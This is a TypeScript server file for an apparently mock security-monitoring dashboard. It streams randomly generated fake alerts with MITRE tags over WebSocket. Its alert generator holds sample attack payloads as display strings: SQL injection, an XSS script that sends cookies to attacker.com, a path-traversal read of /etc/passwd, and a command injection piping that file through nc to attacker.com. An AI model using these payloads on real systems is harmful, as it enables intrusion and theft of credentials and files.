import express from "express";
import path from "path";
import os from "os";
import { createServer } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { createServer as createViteServer } from "vite";
import { generateMockAlertDTO, generateMockTrafficPoint } from "./src/mocks/securityData";

const PORT = parseInt(process.env.PORT || "3001", 10);

async function startServer() {
  const app = express();
  const server = createServer(app);
  const wss = new WebSocketServer({ server });

  const attackTypes = ["DDoS", "SQL Injection", "XSS", "Brute Force", "Port Scan", "LFI", "Command Injection", "Beaconing", "Botnet Activity", "Credential Stuffing"];
  const severities = ["Critical", "High", "Medium", "Low"];
  const protocols = ["HTTP", "HTTPS", "TCP", "UDP", "SSH", "SMB", "DNS", "LDAP"];
  const statuses = ["new", "investigating", "mitigated", "escalated", "resolved", "false_positive"];
  const providers = ["AWS", "Azure", "GCP"];
  const regions = ["us-east-1", "us-west-2", "eu-central-1", "ap-southeast-1"];
  const analysts = ["Admin_Phu", "Sarah_SOC", "John_Sec", "AI_Agent_01"];
  
  const mitreTechniques = [
    { id: "T1190", tactic: "Initial Access", technique: "Exploit Public-Facing Application", description: "Adversaries may attempt to exploit a software vulnerability in an Internet-facing application or system to achieve code execution or gain initial access." },
    { id: "T1595", tactic: "Reconnaissance", technique: "Active Scanning", description: "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting." },
    { id: "T1110", tactic: "Credential Access", technique: "Brute Force", description: "Adversaries may use brute force techniques to gain access to accounts." },
    { id: "T1068", tactic: "Privilege Escalation", technique: "Exploitation for Privilege Escalation", description: "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges." },
    { id: "T1043", tactic: "Command and Control", technique: "Commonly Used Port", description: "Adversaries may use a common port to communicate with command and control infrastructure." },
    { id: "T1071", tactic: "Command and Control", technique: "Application Layer Protocol", description: "Adversaries may communicate using application layer protocols to avoid detection." },
  ];

  let alertCounter = 0;
  function generateAlert() {
    alertCounter++;
    const uniqueId = `THR-${110 + (alertCounter % 900)}`;
    const sourceIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    const destIp = "10.0.12.15";
    const attackType = attackTypes[Math.floor(Math.random() * attackTypes.length)];
    const severity = severities[Math.floor(Math.random() * severities.length)];
    const riskScore = Math.floor(Math.random() * 100);
    const confidence = parseFloat((0.7 + Math.random() * 0.3).toFixed(2));
    const status = statuses[Math.floor(Math.random() * statuses.length)];
    const provider = providers[Math.floor(Math.random() * providers.length)];
    const region = regions[Math.floor(Math.random() * regions.length)];
    const analyst = analysts[Math.floor(Math.random() * analysts.length)];
    const mitre = mitreTechniques[Math.floor(Math.random() * mitreTechniques.length)];

    let payloadText = "username=admin' OR '1'='1'--#apasswordanything&submit=Login";
    if (attackType === "SQL Injection") {
      payloadText = "SELECT * FROM users WHERE user_id = 'admin' OR '1'='1' --";
    } else if (attackType === "XSS") {
      payloadText = "<script>fetch('http://attacker.com/leak?cookie='+document.cookie)</script>";
    } else if (attackType === "LFI") {
      payloadText = "GET /index.php?page=../../../../etc/passwd HTTP/1.1";
    } else if (attackType === "Command Injection") {
      payloadText = "POST /api/exec HTTP/1.1\r\nHost: target.local\r\n\r\ncmd=cat%20%2Fetc%2Fpasswd%20%7C%20nc%20attacker.com%204444";
    } else if (attackType === "Beaconing") {
      payloadText = "HEARTBEAT 0x414141417f454c4602010100000c25a07c11f440 TCP_ALIGN_KEEPALIVE";
    } else if (attackType === "Botnet Activity") {
      payloadText = "IRC JOIN #control_channel_ax90\r\nPING 182749281\r\nSTATS USER_COUNT";
    } else if (attackType === "Credential Stuffing") {
      payloadText = "POST /api/login HTTP/1.1\r\n\r\n{\"user\":\"admin_root\",\"pass\":\"qwerty12345\"}\r\n{\"user\":\"user_backup\",\"pass\":\"password123\"}";
    } else if (attackType === "DDoS") {
      payloadText = "SYN FLOOD - Active Rate: 345,000 pps, Payload Size: 64 bytes";
    } else if (attackType === "Brute Force") {
      payloadText = "SSH AUTH FAILURE - Remote Host: " + sourceIp + " - username: sysadmin, port: 22";
    } else if (attackType === "Port Scan") {
      payloadText = "NMAP SCAN - TCP SYN Stealth (1000 ports scanned, 5 open ports)";
    }

    return {
      id: uniqueId,
      timestamp: new Date().toISOString(),
      sourceIp,
      destIp,
      destPort: Math.floor(Math.random() * 65535),
      attackType,
      protocol: protocols[Math.floor(Math.random() * protocols.length)],
      severity,
      riskScore,
      confidence,
      status,
      cloudProvider: provider,
      region,
      description: `Possible ${attackType} detected from ${sourceIp} targeting internal host ${destIp}.`,
      assignedAnalyst: analyst,
      mitreAttack: mitre,
      timeline: [
        { id: "ev-1", timestamp: new Date(Date.now() - 5000).toISOString(), type: "Detection", description: `Initial detection by AI Model ${attackType}-NLP` },
        { id: "ev-2", timestamp: new Date(Date.now() - 2000).toISOString(), type: "Analysis", description: "Multi-modal correlation engine confirmed threat patterns" }
      ],
      payload: payloadText,
      zeekData: {
        duration: (Math.random() * 10).toFixed(2),
        origBytes: Math.floor(Math.random() * 50000),
        respBytes: Math.floor(Math.random() * 20000),
        connState: "SF",
      },
      suricataData: {
        signatureId: `[1:201${Math.floor(Math.random() * 1000)}:2]`,
        category: mitre.tactic,
      },
      aiDecision: {
        ai1: (0.5 + Math.random() * 0.5).toFixed(2),
        ai2a: attackType,
        ai2b: severity,
      }
    };
  }

  wss.on("connection", (ws) => {
    console.log("Client connected to WebSocket");

    const initialLogs = Array.from({ length: 35 }, () => generateAlert());
    ws.send(JSON.stringify({ type: "INITIAL_DATA", data: initialLogs }));

    const interval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: "NEW_ALERT", data: generateAlert() }));

        const inboundBase = Math.floor(Math.random() * 150) + 150;
        const isAnomalyEvent = Math.random() > 0.85;
        const inboundValue = isAnomalyEvent ? (Math.floor(Math.random() * 600) + 500) : inboundBase;
        const isPeak = isAnomalyEvent && inboundValue > 850;

        ws.send(JSON.stringify({
          type: "TRAFFIC_UPDATE",
          data: {
            timestamp: new Date().toISOString(),
            flows: Math.floor(Math.random() * 500) + 1200,
            anomalies: isAnomalyEvent ? 1 : 0,
            inbound: inboundValue,
            outbound: Math.floor(Math.random() * 200) + 100,
            isAnomaly: isAnomalyEvent,
            isPeak: isPeak
          }
        }));
      }
    }, 2000);

    ws.on("close", () => clearInterval(interval));
  });

  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  const getLocalIpAddress = () => {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      const ifaceList = interfaces[name];
      if (!ifaceList) continue;

      for (const iface of ifaceList) {
        if (iface.family === "IPv4" && !iface.internal) {
          return iface.address;
        }
      }
    }
    return "127.0.0.1";
  };

  server.listen(PORT, "0.0.0.0", () => {
    const localIp = getLocalIpAddress();
    console.log(`\n  ✓ Server running on:`);
    console.log(`    Local:   http://localhost:${PORT}/`);
    console.log(`    Network: http://${localIp}:${PORT}/\n`);
  });
}

startServer();
